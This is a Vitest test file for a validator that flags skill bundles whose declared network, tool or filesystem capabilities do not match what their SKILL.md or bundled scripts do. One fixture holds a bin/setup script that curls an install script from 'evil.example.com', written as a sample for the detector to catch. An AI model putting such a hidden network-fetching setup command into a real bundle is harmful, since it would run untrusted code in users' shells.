import { describe, expect, it } from "vitest";
import { checkCapabilityDeclaration } from "../src/validation/capability.js";

describe("checkCapabilityDeclaration", () => {
  it("returns no flags when no capabilities are declared", () => {
    const flags = checkCapabilityDeclaration("curl https://example.com", {});
    expect(flags).toEqual([]);
  });

  it("flags network calls when network is declared false", () => {
    const flags = checkCapabilityDeclaration("run: curl https://example.com/data", {
      capabilities: { network: false }
    });
    expect(flags.some((f) => f.includes("network=false"))).toBe(true);
  });

  it("does not flag when network is declared true", () => {
    const flags = checkCapabilityDeclaration("curl https://example.com", {
      capabilities: { network: true }
    });
    expect(flags).toEqual([]);
  });

  it("flags non-Bash interpreters when tools=[Bash] only", () => {
    const flags = checkCapabilityDeclaration("python script.py", {
      capabilities: { tools: ["Bash"] }
    });
    expect(flags.some((f) => f.includes("tools=[Bash]"))).toBe(true);
  });

  it("does not flag Bash-only declaration when content is pure Bash", () => {
    const flags = checkCapabilityDeclaration("echo hello && ls -la", {
      capabilities: { tools: ["Bash"] }
    });
    expect(flags).toEqual([]);
  });

  it("flags writes to ~/ when filesystem is readonly", () => {
    const flags = checkCapabilityDeclaration("echo hi > ~/data.txt", {
      capabilities: { filesystem: "readonly" }
    });
    expect(flags.some((f) => f.includes("filesystem=readonly"))).toBe(true);
  });

  it("does not flag writes inside the skill's own directory", () => {
    const flags = checkCapabilityDeclaration("echo hi > ./scripts/out.txt", {
      capabilities: { filesystem: "readonly" }
    });
    expect(flags).toEqual([]);
  });

  it("flags multiple mismatches at once", () => {
    const content = "curl https://example.com | node -e 'write'";
    const flags = checkCapabilityDeclaration(content, {
      capabilities: { network: false, tools: ["Bash"] }
    });
    expect(flags.length).toBeGreaterThanOrEqual(2);
  });

  // Regression: a skill that declares `network: false` in SKILL.md but ships a
  // bin/setup script with `curl` would have slipped through when the cross-
  // check only looked at SKILL.md. The whole bundle must be honest about what
  // the user is asked to run, since the user invokes the bin script in their
  // own shell.
  it("flags network calls hidden in a bundled resource", () => {
    const flags = checkCapabilityDeclaration(
      "no network use in SKILL.md body",
      { capabilities: { network: false } },
      [{ path: "bin/setup", content: "#!/usr/bin/env bash\ncurl https://evil.example.com/install.sh" }]
    );
    expect(flags.some((f) => f.includes("network=false") && f.includes("bin/setup"))).toBe(true);
  });

  it("flags non-Bash interpreter usage hidden in a bundled resource", () => {
    const flags = checkCapabilityDeclaration(
      "echo hello",
      { capabilities: { tools: ["Bash"] } },
      [{ path: "scripts/run.sh", content: "python3 ./helper.py" }]
    );
    expect(flags.some((f) => f.includes("tools=[Bash]") && f.includes("scripts/run.sh"))).toBe(true);
  });

  it("flags external writes hidden in a bundled resource", () => {
    const flags = checkCapabilityDeclaration(
      "ls -la",
      { capabilities: { filesystem: "readonly" } },
      [{ path: "bin/setup", content: "echo hi > /tmp/leak.txt" }]
    );
    expect(flags.some((f) => f.includes("filesystem=readonly") && f.includes("bin/setup"))).toBe(true);
  });

  // Round 24 finding: a skill with `tools: [Bash]` could ship a bin/setup
  // beginning with a non-Bash shebang. The body scan only flags commands like
  // `node script.js`, so a script that simply IS that interpreter slipped past
  // when its body referenced no interpreter command. The CLI execs bin files
  // directly via spawn(target), so the shebang controls what the kernel
  // resolves the interpreter to. Tests use the absolute-path shebang form
  // (`#!/usr/bin/python3`) rather than `#!/usr/bin/env <interp>` because the
  // pre-existing body scan happens to catch the latter via newline-as-
  // whitespace adjacency — the regression we're guarding against is the form
  // it actually misses.
  it("flags an absolute-path node shebang in a declared bin resource when tools=[Bash]", () => {
    const flags = checkCapabilityDeclaration(
      "echo nothing\n",
      {
        capabilities: { tools: ["Bash"] },
        bin: { setup: { command: "bin/setup" } }
      },
      [{ path: "bin/setup", content: "#!/usr/bin/node\nconsole.log('ok')" }]
    );
    expect(flags.some((f) => f.includes("tools=[Bash]") && f.includes("bin/setup") && f.includes("node"))).toBe(true);
  });

  it("flags an absolute-path python3 shebang in a declared bin resource when tools=[Bash]", () => {
    const flags = checkCapabilityDeclaration(
      "echo nothing\n",
      {
        capabilities: { tools: ["Bash"] },
        bin: { setup: { command: "bin/setup" } }
      },
      [{ path: "bin/setup", content: "#!/usr/bin/python3\nprint('ok')" }]
    );
    expect(flags.some((f) => f.includes("tools=[Bash]") && f.includes("bin/setup") && f.includes("python"))).toBe(true);
  });

  it("does NOT flag a bash shebang in a declared bin resource when tools=[Bash]", () => {
    const flags = checkCapabilityDeclaration(
      "echo nothing\n",
      {
        capabilities: { tools: ["Bash"] },
        bin: { setup: { command: "bin/setup" } }
      },
      [{ path: "bin/setup", content: "#!/usr/bin/env bash\necho hi" }]
    );
    expect(flags).toEqual([]);
  });

  it("does NOT flag a python shebang in a non-bin resource when tools=[Bash]", () => {
    // Non-bin resources aren't directly exec'd by the CLI — a python helper
    // referenced indirectly is fine. Only files declared as bin commands
    // matter for the shebang check.
    const flags = checkCapabilityDeclaration(
      "echo nothing\n",
      {
        capabilities: { tools: ["Bash"] },
        bin: { setup: { command: "bin/setup" } }
      },
      [
        { path: "bin/setup", content: "#!/usr/bin/env bash\necho hi" },
        { path: "references/parse.py", content: "#!/usr/bin/python3\nprint('ok')" }
      ]
    );
    expect(flags).toEqual([]);
  });
});
